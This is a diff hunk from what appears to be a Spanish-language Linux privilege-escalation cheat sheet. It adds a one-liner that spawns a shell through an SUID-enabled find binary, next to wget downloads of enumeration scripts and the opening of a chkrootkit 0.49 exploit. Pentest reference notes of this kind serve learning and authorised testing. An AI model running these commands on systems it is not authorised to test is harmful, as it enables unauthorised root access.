@@ -141,6 +141,8 @@ wget https://highon.coffee/downloads/linux-local-enum.sh // Enumeración de posi
 wget https://www.securitysift.com/download/linuxprivchecker.py // Enumeración y posibles exploits
 [--no-check-certificate]
 
+find . -exec /bin/sh \; // Si find tiene SUID activado
+
 ----------------------------------------
 Si la versión de chkrootkit es vulnerable (/etc/chkrootkit/chkrootkit -V == 0.49) =>
 	cat << EOF > rootme.c
